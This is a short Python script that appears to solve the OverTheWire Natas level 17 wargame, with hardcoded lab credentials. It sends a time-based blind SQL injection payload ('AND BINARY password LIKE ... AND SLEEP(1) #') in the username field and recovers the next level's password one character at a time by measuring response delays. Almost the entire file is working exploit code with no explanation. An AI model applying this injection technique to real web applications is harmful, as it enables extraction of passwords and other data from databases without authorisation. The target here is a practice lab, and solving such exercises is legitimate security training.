from pwn import *
import requests
import re
from string import *
from time import *


username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
url = "http://{}.natas.labs.overthewire.org".format(username)
characters = ascii_lowercase + ascii_uppercase + digits

log.progress("Getting the natas18 password, Hold on! ")
session = requests.session()
#web = session.get(url + "index-source.html" , auth = (username, password)).text

seen_password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh"

while True:
    for ch in characters:
        start_time = time()
        print("Trying with the characters " + seen_password + ch)
        web = session.post(url, data={"username" : 'natas18" AND BINARY password LIKE "' + seen_password + ch + '%" AND SLEEP(1) # '}, auth = (username, password)).text
        end_time = time()
        difference = end_time - start_time
        if difference > 1 :
            seen_password += ch
            break
    if len(seen_password) == 32:
        break

print("The password for natas 18 is === " + seen_password)



